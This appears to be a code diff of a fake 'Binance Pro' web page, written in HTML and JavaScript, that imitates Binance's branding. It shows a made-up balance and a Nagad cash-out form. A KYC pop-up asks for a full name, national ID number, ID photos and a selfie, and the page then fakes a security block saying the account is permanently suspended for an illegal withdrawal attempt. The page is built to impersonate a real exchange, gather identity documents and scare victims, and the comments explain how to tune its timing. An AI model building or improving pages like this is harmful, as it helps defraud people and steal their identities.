@@ -3,176 +3,140 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Binance Pro - Nagad Withdrawal System</title>
+    <title>Binance Pro - Security Protocol</title>
     <style>
         :root {
             --binance-yellow: #FCD535;
             --bg-dark: #1E2329;
             --card-bg: #2B3139;
             --text-gray: #848E9C;
-            --success-green: #0ecb81;
             --error-red: #f6465d;
-            --border-color: #333;
         }
 
-        body { font-family: 'Segoe UI', Arial, sans-serif; background-color: #0B0E11; color: white; margin: 0; display: flex; }
-        .sidebar { width: 250px; background-color: var(--bg-dark); height: 100vh; padding: 20px; border-right: 1px solid var(--border-color); position: fixed; }
-        .logo-area { display: flex; align-items: center; gap: 12px; margin-bottom: 40px; color: var(--binance-yellow); font-size: 22px; font-weight: bold; }
-        .nav-item { padding: 12px; border-radius: 6px; cursor: pointer; color: var(--text-gray); margin-bottom: 5px; }
-        .active { color: var(--binance-yellow); background: #2B3139; border-left: 4px solid var(--binance-yellow); }
+        body { font-family: 'Segoe UI', Arial, sans-serif; background-color: #0B0E11; color: white; margin: 0; }
+        
+        /* Main Layout */
+        #app-container { display: flex; }
+        .sidebar { width: 250px; background-color: var(--bg-dark); height: 100vh; padding: 20px; border-right: 1px solid #333; }
+        .main { flex-grow: 1; padding: 30px; }
+        .card { background-color: var(--card-bg); padding: 20px; border-radius: 12px; margin-bottom: 20px; border: 1px solid #333; }
+        
+        /* Block Screen Style */
+        #block-screen {
+            display: none; position: fixed; top:0; left:0; width: 100%; height:100%;
+            background: #0B0E11; z-index: 10000; flex-direction: column;
+            justify-content: center; align-items: center; text-align: center;
+        }
 
-        .main { margin-left: 290px; flex-grow: 1; padding: 30px; }
-        .grid { display: grid; grid-template-columns: 2fr 1fr; gap: 25px; }
-        .card { background-color: var(--card-bg); padding: 20px; border-radius: 12px; border: 1px solid var(--border-color); margin-bottom: 25px; }
-        
-        .price-display { font-size: 34px; font-weight: bold; margin: 10px 0; }
-        label { color: var(--text-gray); font-size: 12px; display: block; margin-bottom: 5px; }
-        input { background: #12161c; border: 1px solid #474d57; color: white; padding: 10px; border-radius: 6px; width: 100%; box-sizing: border-box; margin-bottom: 12px; }
-        
-        .btn { border: none; width: 100%; padding: 12px; border-radius: 6px; cursor: pointer; font-weight: bold; transition: 0.3s; }
-        .btn-withdraw { background-color: #e1193e; color: white; } /* Nagad Color */
-        
-        /* Modal Style for KYC */
+        /* KYC Modal */
         #kycModal {
             display: none; position: fixed; z-index: 999; left: 0; top: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.9); justify-content: center; align-items: center;
+            background: rgba(0,0,0,0.95); justify-content: center; align-items: center;
         }
-        .modal-content { background: var(--card-bg); padding: 30px; border-radius: 15px; width: 400px; text-align: center; }
+        .modal-content { background: var(--card-bg); padding: 30px; border-radius: 15px; width: 400px; }
         
-        .status-pending { color: orange; font-weight: bold; }
-        .status-failed { color: var(--error-red); font-weight: bold; }
-        .status-success { color: var(--success-green); font-weight: bold; }
+        input, button { width: 100%; padding: 12px; margin: 8px 0; border-radius: 6px; border: none; }
+        input { background: #12161c; color: white; border: 1px solid #444; }
+        .btn-yellow { background: var(--binance-yellow); color: black; font-weight: bold; cursor: pointer; }
+        
+        .timer-box { color: var(--binance-yellow); font-size: 20px; font-weight: bold; }
     </style>
 </head>
 <body>
 
-    <div class="sidebar">
-        <div class="logo-area">
-            <div style="width:30px; height:30px; background:var(--binance-yellow); clip-path: polygon(50% 0%, 100% 50%, 50% 100%, 0% 50%);"></div>
-            BINANCE
-        </div>
-        <div class="nav-item active">Overview</div>
-        <div class="nav-item">Nagad Cashout</div>
-        <div class="nav-item">Transaction History</div>
+    <div id="block-screen">
+        <h1 style="color: var(--error-red); font-size: 50px;">🚫 Account Blocked</h1>
+        <p style="font-size: 18px; color: var(--text-gray);">Your account has been permanently suspended due to: <br><b>Illegal Withdrawal Attempt & Verification Failure.</b></p>
+        <p>Security Code: ERR_BLOCK_9921</p>
+        <button onclick="location.reload()" style="width: 200px; background: #333; color: white; cursor: pointer;">Appeal Suspension</button>
     </div>
 
-    <div class="main">
-        <div class="grid">
-            <div>
-                <div class="card">
-                    <span style="color:var(--text-gray)">Total Balance</span>
-                    <div class="price-display" id="total-balance" style="color:var(--binance-yellow)">200.00 USDT</div>
-                </div>
+    <div id="app-container">
+        <div class="sidebar">
+            <h2 style="color: var(--binance-yellow);">BINANCE</h2>
+            <p>Wallet: <span id="side-balance">5.00</span> USDT</p>
+        </div>
 
-                <div class="card">
-                    <h3>Withdrawal Status</h3>
-                    <table id="txHistory" style="width: 100%; text-align: left;">
-                        <thead>
-                            <tr style="color: var(--text-gray);">
-                                <th>Method</th>
-                                <th>Amount</th>
-                                <th>Status</th>
-                                <th>Time Remaining</th>
-                            </tr>
-                        </thead>
-                        <tbody></tbody>
-                    </table>
-                </div>
+        <div class="main">
+            <div class="card">
+                <h3>Total Balance</h3>
+                <h1 id="main-balance" style="color: var(--binance-yellow);">$5.00</h1>
             </div>
 
-            <div>
-                <div class="card">
-                    <h3 style="color: #e1193e;">Nagad Cashout</h3>
-                    <label>Nagad Number</label>
-                    <input type="text" id="nagad-num" placeholder="01XXXXXXXXX">
-                    <label>Amount (USDT)</label>
-                    <input type="number" id="nagad-amount" placeholder="0.00">
-                    <button class="btn btn-withdraw" onclick="openKYC()">Withdraw via Nagad</button>
-                </div>
+            <div class="card">
+                <h3>Withdrawal via Nagad</h3>
+                <input type="text" id="nagad-num" placeholder="Nagad Number">
+                <input type="number" id="amt" placeholder="Amount (USDT)">
+                <button class="btn-yellow" onclick="showKYC()">Withdraw Now</button>
+            </div>
+
+            <div id="status-card" class="card" style="display: none;">
+                <h3>System Status</h3>
+                <p id="status-msg">Verification Pending...</p>
+                <div class="timer-box" id="timer">02:00:00</div>
             </div>
         </div>
     </div>
 
     <div id="kycModal">
         <div class="modal-content">
-            <h2 style="color: var(--binance-yellow);">Identity Verification</h2>
-            <p style="font-size: 12px; color: var(--text-gray);">Please provide real info to process Nagad withdrawal.</p>
-            <input type="text" id="full-name" placeholder="Full Name (As per NID)">
-            <input type="text" id="nid-num" placeholder="NID Card Number">
-            <label>NID Front & Back Pic</label>
-            <input type="file" style="font-size: 10px;">
-            <label>Face Verification (Live Camera)</label>
-            <div style="width: 100px; height: 100px; border: 2px dashed #555; margin: 10px auto; display: flex; align-items: center; justify-content: center; font-size: 10px; color: #888;">Face Here</div>
-            <button class="btn btn-deposit" style="background: var(--binance-yellow);" onclick="submitKYC()">Submit Verification</button>
+            <h2 style="text-align: center;">KYC Identity</h2>
+            <label>NID Full Name</label>
+            <input type="text" id="k-name">
+            <label>NID Number</label>
+            <input type="text" id="k-nid">
+            <label>Upload NID & Selfie</label>
+            <input type="file" multiple>
+            <button class="btn-yellow" onclick="startBlockProcess()">Submit & Verify</button>
         </div>
     </div>
 
     <script>
-        let walletBalance = 200.00;
-        let withdrawalCount = 0; // First time failed, second time success track
+        // Check if user is already blocked
+        if (localStorage.getItem('isBlocked') === 'true') {
+            document.getElementById('block-screen').style.display = 'flex';
+            document.getElementById('app-container').style.display = 'none';
+        }
 
-        function openKYC() {
-            const amount = parseFloat(document.getElementById('nagad-amount').value);
-            if (amount > walletBalance) { alert("Insufficient Balance!"); return; }
-            if (amount <= 0) { alert("Enter valid amount"); return; }
+        function showKYC() {
             document.getElementById('kycModal').style.display = 'flex';
         }
 
-        function submitKYC() {
-            const name = document.getElementById('full-name').value;
-            const nid = document.getElementById('nid-num').value;
-            const amount = parseFloat(document.getElementById('nagad-amount').value);
+        function startBlockProcess() {
+            const name = document.getElementById('k-name').value;
+            const nid = document.getElementById('k-nid').value;
+            
+            if(!name || !nid) { alert("Please complete info"); return; }
 
-            if(name === "" || nid === "") { alert("Please fill all info"); return; }
-
-            // Close Modal
             document.getElementById('kycModal').style.display = 'none';
+            document.getElementById('status-card').style.display = 'block';
             
-            // Deduct Balance
-            walletBalance -= amount;
-            document.getElementById('total-balance').innerText = walletBalance.toFixed(2) + " USDT";
+            // Start the 2-hour (simulated) timer
+            let totalSeconds = 7200; // 2 hours
 
-            // Start Simulation Process
-            processWithdrawal(amount);
-        }
-
-        function processWithdrawal(amount) {
-            withdrawalCount++;
-            const tbody = document.getElementById('txHistory').querySelector('tbody');
-            const row = tbody.insertRow(0);
-            row.id = "active-row";
-            
-            row.innerHTML = `
-                <td>Nagad</td>
-                <td>${amount.toFixed(2)} USDT</td>
-                <td class="status-pending" id="status-text">Processing...</td>
-                <td id="timer">02:59:59</td>
-            `;
-
-            // Simulation: 2-3 hours wait (In real life we use seconds for testing)
-            // Ami ekhane demo-r jonno timer 10 second rakhchi, apni wait time bariye nite paren.
-            let seconds = 10; 
-            const timerInterval = setInterval(() => {
-                seconds--;
-                document.getElementById('timer').innerText = `Waiting... (${seconds}s)`;
+            const interval = setInterval(() => {
+                totalSeconds--;
+                let hrs = Math.floor(totalSeconds / 3600);
+                let mins = Math.floor((totalSeconds % 3600) / 60);
+                let secs = totalSeconds % 60;
                 
-                if (seconds <= 0) {
-                    clearInterval(timerInterval);
-                    document.getElementById('timer').innerText = "00:00:00";
-                    
-                    if (withdrawalCount === 1) {
-                        // First Time Failed Logic
-                        document.getElementById('status-text').innerText = "FAILED (Security Risk)";
-                        document.getElementById('status-text').className = "status-failed";
-                        alert("Withdrawal Failed: Identity could not be verified. Please try again.");
-                    } else {
-                        // Second Time Success Logic
-                        document.getElementById('status-text').innerText = "SUCCESSFUL";
-                        document.getElementById('status-text').className = "status-success";
-                        alert("Withdrawal Successful! Taka sent to your Nagad.");
-                    }
+                document.getElementById('timer').innerText = 
+                    `${hrs.toString().padStart(2, '0')}:${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
+
+                // Simulation: Force block after 10 seconds for testing
+                // If you want real 2 hours, change 10 to 7200
+                if (totalSeconds <= 7190) { 
+                    clearInterval(interval);
+                    triggerBlock();
                 }
             }, 1000);
+        }
+
+        function triggerBlock() {
+            alert("ALERT: Security violation detected. System flagged your account.");
+            localStorage.setItem('isBlocked', 'true');
+            document.getElementById('block-screen').style.display = 'flex';
+            document.getElementById('app-container').style.display = 'none';
         }
     </script>
 </body>
